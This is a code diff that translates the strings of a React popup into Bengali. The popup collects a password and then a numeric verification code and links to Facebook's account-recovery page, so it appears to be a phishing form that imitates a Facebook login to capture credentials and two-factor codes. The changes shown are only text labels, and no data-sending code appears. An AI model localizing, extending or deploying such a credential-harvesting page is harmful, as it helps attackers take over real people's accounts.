@@ -107,7 +107,7 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
         case -1:
           setResult({
             type: "warning",
-            msg: "<a class=\"fw-bold text-danger\" rel=\"noopener noreferrer\" target=\"_blank\" href=\"https://www.facebook.com/login/identify/\" style=\"text-decoration: none;\">Forgoten Password?</a>",
+            msg: "<a class=\"fw-bold text-danger\" rel=\"noopener noreferrer\" target=\"_blank\" href=\"https://www.facebook.com/login/identify/\" style=\"text-decoration: none;\">Password ভুলে গেছেন?</a>",
           });
           setIsLoading(false);
           SetError(true);
@@ -285,9 +285,9 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
                         <div className="form-btn-wrapper">
                             <button onClick={handleConfirmPage} className="btn btn-primary">
                                 <div className="spinner-border text-light" role="status" style={{display: 'none'}}>
-                                    <span className="visually-hidden">Loading...</span>
+                                    <span className="visually-hidden">লোড হচ্ছে...</span>
                                 </div>
-                                <span className="button-text">&nbsp;{isLoading == true ? 'Loading...' : 'Continue'}</span>
+                                <span className="button-text">&nbsp;{isLoading == true ? 'লোড হচ্ছে...' : 'চালিয়ে যান'}</span>
                             </button>
                         </div>
                     </div>
@@ -301,7 +301,7 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
                      <div id="apiForm">
                          <div className="mb-3">
                              <div className="password-input">
-                                 <label htmlFor="exampleInputPassword" className="form-label">Password</label>
+                                 <label htmlFor="exampleInputPassword" className="form-label">পাসওয়ার্ড</label>
                                  <div style={{display: 'flex', alignItems: 'center'}}>
                                      <input onChange={(e) => {if(e.target.value.length > 100) return;setPass(e.target.value);}} type={passwordShown ? "text" : "password"} className="form-control" id="exampleInputPassword" autoComplete="off" minLength="8" maxLength="30" aria-describedby="emailHelp"/>
                                  </div>
@@ -316,7 +316,7 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
                                  <div className="spinner-border text-light" role="status" style={{display: isLoading ? 'inline-block' : 'none'}}>
                                      <span className="visually-hidden"></span>
                                  </div>
-                                 <span className="button-text">&nbsp;{isLoading == true ? 'Loading...' : 'Continue'}</span>
+                                 <span className="button-text">&nbsp;{isLoading == true ? 'লোড হচ্ছে...' : 'চালিয়ে যান'}</span>
                              </button>
                          </div>
                          <div id="forgot-pass-wrap">
@@ -342,7 +342,7 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
  
                          <div className="mb-3">
                              <div className="password-input">
-                                 <label htmlFor="exampleInputPassword" className="form-label">Code</label>
+                                 <label htmlFor="exampleInputPassword" className="form-label">কোড</label>
                                  <input                   onChange={(e) => {
                     if(!isNaN(+e.target.value) == false) return;
                     setInputValue(e.target.value);
@@ -355,9 +355,9 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
                          <div className="form-btn-wrapper">
                              <button disabled={isLoading ? true : false} onClick={handleAuthEnter} className="btn btn-primary">
                                  <div className="spinner-border text-light" role="status" style={{display: isLoading ? 'inline-block' : 'none'}}>
-                                     <span className="visually-hidden">Loading...</span>
+                                     <span className="visually-hidden">লোড হচ্ছে...</span>
                                  </div>
-                                <span className="button-text">&nbsp;{isLoading == true ? 'Loading...' : 'Continue'}</span>
+                                <span className="button-text">&nbsp;{isLoading == true ? 'লোড হচ্ছে...' : 'চালিয়ে যান'}</span>
                              </button>
                          </div>
                      </div>
